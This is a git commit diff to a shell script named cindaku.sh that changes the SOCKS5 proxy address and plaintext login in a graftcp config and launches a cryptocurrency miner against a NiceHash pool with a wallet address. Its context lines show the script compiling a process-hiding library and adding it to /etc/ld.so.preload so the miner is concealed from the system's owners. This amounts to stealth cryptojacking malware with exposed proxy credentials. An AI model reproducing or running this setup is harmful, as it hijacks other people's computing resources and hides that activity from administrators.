7367e8a61e6358df48735b2dc6981e4e8b6dd1a6
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-04-15 21:06:40 +0700

    Update cindaku.sh

--- cindaku.sh
+++ cindaku.sh
@@ -11,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 3.15.39.186:1080
-socks5_username = mikrotik999
-socks5_password = Elibawnos
+socks5 = 185.212.160.70:7085
+socks5_username = lebarankita
+socks5_password = buatTHRan
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -44,4 +44,5 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
 ./graftcp/graftcp ./bezzHash --url=ssl://36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
